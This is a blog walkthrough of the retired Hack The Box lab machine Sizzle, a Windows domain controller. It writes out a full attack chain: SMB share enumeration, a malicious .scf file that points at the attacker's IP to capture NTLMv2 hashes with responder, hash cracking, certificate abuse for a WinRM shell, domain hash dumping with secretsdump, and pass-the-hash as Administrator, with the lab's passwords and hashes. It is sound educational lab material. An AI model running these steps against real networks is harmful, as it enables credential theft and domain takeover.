---
published: false
layout: post
author: jake
date: '2019-06-02 00:00:01 UTC'
tags: htb walkthrough Sizzle
Published: true
---
This week we are taking a look at the retired Hack The Box machine [Sizzle](https://www.hackthebox.eu/home/machines/profile/169) (Medium difficulty)

Start off with out nmap scans:
```
root@kali: nmap -sC -sV -oN nmap 10.10.10.103      
Starting Nmap 7.70 ( https://nmap.org ) at 2019-06-01 10:53 AEST
Nmap scan report for 10.10.10.103
Host is up (0.26s latency).
Not shown: 987 filtered ports
PORT     STATE SERVICE           VERSION
21/tcp   open  ftp               Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp   open  http              Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title (text/html).
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-01T01:00:50+00:00; +6m26s from scanner time.
443/tcp  open  ssl/http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-01T01:00:48+00:00; +6m26s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-01T01:00:52+00:00; +6m26s from scanner time.
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-01T01:00:51+00:00; +6m26s from scanner time.
3269/tcp open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=sizzle.htb.local
| Not valid before: 2018-07-03T17:58:55
|_Not valid after:  2020-07-02T17:58:55
|_ssl-date: 2019-06-01T01:00:49+00:00; +6m25s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.70%I=7%D=6/1%Time=5CF1CCA9%P=x86_64-pc-linux-gnu%r(DNSVe
SF:rsionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x
SF:04bind\0\0\x10\0\x03");
Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 6m25s, deviation: 0s, median: 6m25s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-06-01 11:00:49
|_  start_date: 2019-05-27 09:52:37

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.48 seconds

root@kali: nmap -p- --max-retries 1 -Pn -T4 --oN nmap-allports 10.10.10.103
...
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
49684/tcp open  unknown
49697/tcp open  unknown
52633/tcp open  unknown
52641/tcp open  unknown
52649/tcp open  unknown
```

We notice that the machine has a website, smb, ldap and a bunch of other ports open including 445 and 464. After a bit of enumeration it is possible this is a Windows domain controller machine.

Hitting the website all we see is some delicious looking bacon. Because there is nothing here of any use, we run a gobuster ( `gobuster -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster.log -u http://10.10.10.103` ) to enumerate the web server while we move on to manually enumerate some of the other ports.

Starting from the top, nmap suggests that we have anonymous access to an ftp server. Testing it out we are able to connect and read an empty directory, but we are not able to write any files to it.

Moving on to SMB we attempt to connect as the guest user and see if there are any shares we can access:
```
root@kali: smbmap -u guest -H 10.10.10.103
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.103...
[+] IP: 10.10.10.103:445	Name: sizzle.htb                                        
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	CertEnroll                                        	NO ACCESS
	Department Shares                                 	READ ONLY
	IPC$                                              	READ ONLY
	NETLOGON                                          	NO ACCESS
	Operations                                        	NO ACCESS
	SYSVOL                                            	NO ACCESS
```
Looks like as guest we have some read only access. Note that sometimes you need to add `-u guest` when using smbmap as implicitly it tried to connect as Administrator.

We’re going to use SMB client to connect. Looking at the options:
```
Usage: smbclient [-?EgqBVNkPeC] [-?|--help] [--usage] [-R|--name-resolve=NAME-RESOLVE-ORDER]
        [-M|--message=HOST] [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST] [-m|--max-protocol=LEVEL]
        [-T|--tar=<c|x>IXFqgbNan] [-D|--directory=DIR] [-c|--command=STRING] [-b|--send-buffer=BYTES]
        [-t|--timeout=SECONDS] [-p|--port=PORT] [-g|--grepable] [-q|--quiet] [-B|--browse]
        [-d|--debuglevel=DEBUGLEVEL] [-s|--configfile=CONFIGFILE] [-l|--log-basename=LOGFILEBASE]
        [-V|--version] [--option=name=value] [-O|--socket-options=SOCKETOPTIONS]
        [-n|--netbiosname=NETBIOSNAME] [-W|--workgroup=WORKGROUP] [-i|--scope=SCOPE] [-U|--user=USERNAME]
        [-N|--no-pass] [-k|--kerberos] [-A|--authentication-file=FILE] [-S|--signing=on|off|required]
        [-P|--machine-pass] [-e|--encrypt] [-C|--use-ccache] [--pw-nt-hash] service <password>
```

It looks like we can literally just connect with `smbclient “\\path-to-server\share”`

Time to connect and see if there is anything in the directory that we might be able to use. Ignore the prompt for password, just hit enter and you will be allowed through.
```
root@kali: smbclient "\\\\10.10.10.103\\Department Shares"
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Wed Jul  4 01:22:32 2018
  ..                                  D        0  Wed Jul  4 01:22:32 2018
  Accounting                          D        0  Tue Jul  3 05:21:43 2018
  Audit                               D        0  Tue Jul  3 05:14:28 2018
  Banking                             D        0  Wed Jul  4 01:22:39 2018
  CEO_protected                       D        0  Tue Jul  3 05:15:01 2018
  Devops                              D        0  Tue Jul  3 05:19:33 2018
  Finance                             D        0  Tue Jul  3 05:11:57 2018
  HR                                  D        0  Tue Jul  3 05:16:11 2018
  Infosec                             D        0  Tue Jul  3 05:14:24 2018
  Infrastructure                      D        0  Tue Jul  3 05:13:59 2018
  IT                                  D        0  Tue Jul  3 05:12:04 2018
  Legal                               D        0  Tue Jul  3 05:12:09 2018
  M&A                                 D        0  Tue Jul  3 05:15:25 2018
  Marketing                           D        0  Tue Jul  3 05:14:43 2018
  R&D                                 D        0  Tue Jul  3 05:11:47 2018
  Sales                               D        0  Tue Jul  3 05:14:37 2018
  Security                            D        0  Tue Jul  3 05:21:47 2018
  Tax                                 D        0  Tue Jul  3 05:16:54 2018
  Users                               D        0  Wed Jul 11 07:39:32 2018
  ZZ_ARCHIVE                          D        0  Tue Jul  3 05:32:58 2018
```

Folders that look attractive of the bat:

* Infosec
* IT
* Security
* Users

However when looking at these folders the only folder that looks appealing is Users:
```
smb: \Users\> dir
  .                                   D        0  Wed Jul 11 07:39:32 2018
  ..                                  D        0  Wed Jul 11 07:39:32 2018
  amanda                              D        0  Tue Jul  3 05:18:43 2018
  amanda_adm                          D        0  Tue Jul  3 05:19:06 2018
  bill                                D        0  Tue Jul  3 05:18:28 2018
  bob                                 D        0  Tue Jul  3 05:18:31 2018
  chris                               D        0  Tue Jul  3 05:19:14 2018
  henry                               D        0  Tue Jul  3 05:18:39 2018
  joe                                 D        0  Tue Jul  3 05:18:34 2018
  jose                                D        0  Tue Jul  3 05:18:53 2018
  lkys37en                            D        0  Wed Jul 11 07:39:04 2018
  morgan                              D        0  Tue Jul  3 05:18:48 2018
  mrb3n                               D        0  Tue Jul  3 05:19:20 2018
  Public
```
Looking through the directories there was nothing within them, however since we are here and we know that SMB swings both ways, lets see if we can write files: 
```
smb: \Users\Public\> put nmap
putting file nmap as \Users\Public\nmap (4.6 kb/s) (average 4.6 kb/s)
...
smb: \ZZ_ARCHIVE\> put nmap
putting file nmap as \ZZ_ARCHIVE\nmap (4.6 kb/s) (average 4.6 kb/s)
smb: \ZZ_ARCHIVE\> dir
  .                                   D        0  Tue Jun  4 17:22:25 2019
  ..                                  D        0  Tue Jun  4 17:22:25 2019
  AddComplete.pptx                    A   419430  Tue Jul  3 05:32:58 2018
  AddMerge.ram                        A   419430  Tue Jul  3 05:32:57 2018
...
  NewInitialize.doc                   A   419430  Tue Jul  3 05:32:57 2018
  nmap                                A     3325  Tue Jun  4 17:22:25 2019
  OutConnect.mpeg2                    A   419430  Tue Jul  3 05:32:58 2018
...
  WriteUninstall.mp3                  A   419430  Tue Jul  3 05:32:58 2018
  x                                   A        0  Mon Jun  3 15:31:20 2019

		7779839 blocks of size 4096. 2782231 blocks available
smb: \ZZ_ARCHIVE\>
```

From this exercise we have learned a few  things:

1. A bunch of potential usernames for enumeration.
2. That Amanda has an account that might have some level of admin privileges.
3. We have write permissions on the public user directory and the zz_archive directory

Moving on to ZZ_ARCHIVE, we see that it also has some files in it. To recursively download them all we use the following series of commands:
```
smb: \> mask ""
smb: \> recurse ON
smb: \> prompt OFF
smb: \> mget *
```

Looking at the files we can see that they are all the same file size and all completely empty.

When researching SMB attacks, we come across something known as an [SCF attack](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) (Thanks to community member Grub for pointing us in the right direction)

This involved crafting a malicious .scf file and placing on the server, then when someone attempts to open the directory, the file will attempt to open a remote icon file. During this process an authentication attempt is made and we can use tools such as responder to capture the authentication request and gain an NTLM hash.

To perform this attack we create a file called `thoseguys.scf`:
```
[Shell]
Command=2
IconFile=\\10.10.14.3\thoseguys.ico
[Taskbar]
Command=ToggleDesktop
```
Where `10.10.14.3` is our attacking machine’s IP address.

once created we set up a responder listener:
```
root@kali: responder -A -f -I tun0 -v
...
[+] Listening for events...
```

then we head back to our smb connection and upload the malicious file everywhere we can:
```
smb: \users\public\> put thoseguys.scf
putting file thoseguys.scf as \users\public\thoseguys.scf (0.1 kb/s) (average 0.1 kb/s)
smb: \users\public\>cd ../../zz_archive
smb: \zz_archive\> put thoseguys.scf
putting file thoseguys.scf as \zz_archive\thoseguys.scf (0.1 kb/s) (average 0.1 kb/s)
smb: \zz_archive\> 
```

In a normal penetration test or attack scenario this is where we would try and convince someone to browse to the folder with the malicious file or wait until it happens naturally, because this is a ctf, by the time we had uploaded the file in both places and switched back to our responder window we already had some connection attempts:
```
[+] Listening for events...
[SMBv2] NTLMv2-SSP Client   : 10.10.10.103
[SMBv2] NTLMv2-SSP Username : HTB\amanda
[SMBv2] NTLMv2-SSP Hash     : amanda::HTB:7da3521ffae8af0f:840B70B5E99A029B27EDD72BB6153CEA:0101000000000000C0653150DE09D201D0775844734B3444000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000004EC1D674A5A8095E7CA0A3F65160E194ABE5F6A1D2C369D150CA87963ED7FF00A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003300000000000000000000000000
```

Looks like the amanda user has browsed to the folder and as a by product we have caught the NTLMv2 authentication attempt and hash.

Bringing the hash over to hashcat we are able to crack the weak password `Ashare1972`:
```
root@kali: hashcat64.exe -m 5600 Sizzle-Amanda.hash /usr/share/wordlists/rockyou.txt
...
* Runtime...: 2 secs

AMANDA::HTB:7da3521ffae8af0f:840b70b5e99a029b27edd72bb6153cea:0101000000000000c0653150de09d201d0775844734b3444000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d2010600040002000000080030003000000000000000010000000020000004ec1d674a5a8095e7ca0a3f65160e194abe5f6a1d2c369d150ca87963ed7ff00a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310034002e003300000000000000000000000000:Ashare1972

Session..........: hashcat
Status...........: Cracked
Hash.Type........: NetNTLMv2
```

Now all we need is somewhere to use the credentials… eventually we try gobustering again, this time with a different wordlist and some additional response codes and we get some better results:
```
root@kali: gobuster -t 50 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o gobuster-common.log -u http://10.10.10.103 -s 200,204,301,302,307,403,401
/Images (Status: 301)
/aspnet_client (Status: 301)
/certenroll (Status: 301)
/certsrv (Status: 401)
/images (Status: 301)
/index.html (Status: 200)
```

In this case we are telling gobuster that we want to consider a `401 Unauthorized response` as a successful one (because it probably means the site prompted for credentials and didn’t get them)

Looking at the new results we find that `/certenroll` actually returns a 403 Forbidden after the redirect, but the `/certsrv` does indeed prompt for credentials.

Entering the credentials we have for amanda gets us in:
![2b303eb2-091f-4513-984b-8c21cec60d3d.png]({{site.baseurl}}/Images/Sizzle/2b303eb2-091f-4513-984b-8c21cec60d3d.png)

The site says that we can request certificates and download the CA certificate (which we can might be able to sign our own certificates similar to our attack against Ethereal)

So we download the CA certificate as base64 and browsing the rest of the options we see that there is an advanced certificate request page where we can submit our own certificates for something.

Looking back through our nmap results we see something called wsman and wsmans on ports `5985` and `5986`:
```
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open     ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername:<unsupported>, DNS:sizzle.HTB.LOCAL
| Not valid before: 2019-05-27T07:42:58
|_Not valid after:  2020-05-26T07:42:58
|_ssl-date: 2019-06-01T01:12:20+00:00; +6m26s from scanner time.
| tls-alpn: 
|   h2
|_  http/1.1
```

Researching what the wsman service is, we are able to determine that what we have is [Windows Remote Management (WinRM)](https://docs.microsoft.com/en-us/windows/desktop/winrm/portal)

This is generally a powershell api, but there are libraries that allow Linux to connect to it. such as winrm_shell.rb (https://github.com/Alamot/code-snippets/blob/master/winrm/winrm_shell.rb)

If you get an error about being unable to winrm you will need to install the `winrm` gem:
```
`require': cannot load such file -- winrm
root@kali: gem install winrm
```

We try using the username and password that we have for amanda, but get a bunch of connection errors. Reading through the [winrm ruby documentation](https://github.com/WinRb/WinRM#ssl) we see that when connecting with :ssl we are also able to pass it certificates for the connection. Now it is time to generate some certificate requests of our own and get them trusted by the server.

Start off by generating a certificate request locally:
```
root@kali: openssl req -newkey rsa:2048 -nodes -keyout thoseguys.key -out thoseguys.csr
```
Hit enter through everything to leave them as the defaults. Now we head back to the advanced certificate request page and submit our .csr file:
![b49aa712-8d9a-478e-987c-c82243fb54c6.png]({{site.baseurl}}/Images/Sizzle/b49aa712-8d9a-478e-987c-c82243fb54c6.png)



Be sure to also select Usercert from the select list.

Once submitted we are able to download a certificate (.cer) and a certificate chain (.p7b).

Let’s take a moment to explain what we just did. A Certificate Signing Request (CSR) is a block of encoded text that is given to a Certificate Authority when applying for an SSL Certificate. 

So basically what we have done, is generate a certificate request, submitted it to the server, which has then used it’s CA certificate to generate us a signed certificate (.cer) for our private key file (.key) we generated using openssl earlier.

Using WinRM, we are now able to attempt to connect to the remote management service using our signed certificate and private key, which the server will validate and hopefully allow us to connect.

This can be compared to something like when we generate a public and private SSH key, and place the public key in the remote authorized_keys file. When we connect with the private key, the server checks if it has a matching public key (or in this case if the cert is trusted / signed) and if everything checks out, lets us connect without credentials.

We update the connection details of the `winrm_shell` script with the certificate instead:
```
conn = WinRM::Connection.new( 
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: '/root/Documents/htb/Sizzle/thoseguys.cer',
  client_key: '/root/Documents/htb/Sizzle/thoseguys.key',
  :no_ssl_peer_verification => true
)
```
Once updated we can run the shell and see what happens:
```
root@kali: ./winrm_shell.rb                           
PS htb\amanda@SIZZLE Documents> whoami
htb\amanda
PS htb\amanda@SIZZLE Documents> 
```

We are in the users directory… but we don’t see any flags or interesting files. Once our scrounging tool is complete it would have come in handy in this case, but eventually we find a file on the machine called `file.txt`:
```
PS htb\amanda@SIZZLE system32> type file.txt
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c718f548c75062ada93250db208d3178:::

Domain    User  ID  Hash
------    ----  --  ----
HTB.LOCAL Guest 501 -   
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrb3n:1105:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
```

These are NTLM hashes. Cleaned and put through hashcat we get a hit for two of them:
```
bceef4f6fe9c026d1d8dec8dce48adef:Football#7
7d0516ea4b6ed084f3fdf71c47d9beb3:Ashare1972
```

We already knew amandas password, but now we also have mrb3n and mrlky’s password.

In the `C:\Users` directory we see that there is no mrb3n user, so we need to try to swap to the mrlky user using their password.

Another tool from the makers of responder is `secretsdump.py`. We can use this tool to connect to the target with local account credentials and try to get any hash dumps. This was attempted when we had amandas credentials, but an `rpc_s_access_denied error` is recieved, so amanda does not have permissions to connect through rpc. mrlky on the other hand can. and we get some new and different hashes to last time:
```
root@kali: /opt/enum/Impacket/examples/secretsdump.py sizzle.htb.local/mrlky:Football#7@10.10.10.103
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:85aac7144a34cbcacffcccb77aeeab69:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:e2db3763f4b491b4c08298f34357fb42d1e291ffcf795267cb3f5d537dc09309
SIZZLE$:aes128-cts-hmac-sha1-96:755b1eb5d09c67e4c9779dc86ec39f18
SIZZLE$:des-cbc-md5:ced5437aab86c7e3
[*] Cleaning up... 
```

We notice another new user sizzler, as well as the administrator hash is different to the one we found in the file.txt. Heading back over to hashcat we try to crack the new hashes but none of them get a hit.

Lucky for us though, just because we can’t crack the hash doesn’t mean we can’t use it. Next we use smbclient to perform a pass-the-hash attack and connect to smb using the administrators hash.
```
root@kali: smbclient \\\\10.10.10.103\\C$ -U "Administrator" --pw-nt-hash f6b7160bfc91823792e0ac3a162c9267
Try "help" to get a list of possible commands.
smb: \> 
```

Now that we are connected as the administrator, we can read both the user.txt and the root.txt:
```
smb: \> get users\mrlky\desktop\user.txt
getting file \users\mrlky\desktop\user.txt of size 32 as users\mrlky\desktop\user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get users\administrator\desktop\root.txt
getting file \users\administrator\desktop\root.txt of size 32 as users\administrator\desktop\root.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \>
```
